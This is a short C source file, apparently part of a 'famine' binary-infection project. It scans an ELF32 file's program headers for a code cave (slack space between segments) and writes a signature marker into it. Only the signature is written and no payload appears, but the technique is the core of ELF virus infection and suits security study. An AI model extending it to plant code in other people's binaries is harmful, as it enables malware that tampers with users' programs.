#include "famine.h"

#include <elf.h> // Elf32_Phdr
#include <stdint.h> // uintN_t, UINT32_MAX
#include <string.h> // memcpy()

static uint32_t elf32_find_next_segment(Elf32_Phdr *phdr, uint16_t phnum,
                                        uint16_t index)
{
	uint32_t curr, next, tmp;

	curr = phdr[index].p_offset;
	next = UINT32_MAX;

	for (uint32_t i = 0; i < phnum; i++) {
		if (i == index)
			continue ;

		tmp = phdr[i].p_offset;
		if (tmp > curr && tmp < next)
			next = tmp;
	}
	return (next);
}

static int check_segment_bounds(t_file *file, Elf32_Phdr *phdr)
{
	if (phdr->p_offset > file->size)
		return (0);
	if (phdr->p_filesz > file->size - phdr->p_offset)
		return (0);
	return (1);
}

static int is_valid_code_cave(t_file *file, uint32_t cave_start,
                              uint32_t cave_end)
{
	if (cave_end == UINT32_MAX)
		return (0);
	if (cave_end <= cave_start)
		return (0);
	if (cave_end - cave_start < SIGNATURE_SIZE)
		return (0);
	if (SIGNATURE_SIZE > file->size - cave_start)
		return (0);
	return (1);
}

int sign_elf32_cavity(t_file *file, t_elf32 *elf32)
{
	uint32_t cave_start, cave_end;

	for (uint32_t i = 0; i < elf32->ehdr->e_phnum; i++) {
		if (!check_segment_bounds(file, &elf32->phdr[i]))
			continue ;

		cave_start = elf32->phdr[i].p_offset + elf32->phdr[i].p_filesz;
		cave_end = elf32_find_next_segment(elf32->phdr,
		                                   elf32->ehdr->e_phnum,
		                                   (uint16_t)i);

		if (!is_valid_code_cave(file, cave_start, cave_end))
			continue ;

		memcpy(file->map + cave_start, SIGNATURE, SIGNATURE_SIZE);
		return (0);
	}
	return (1);
}
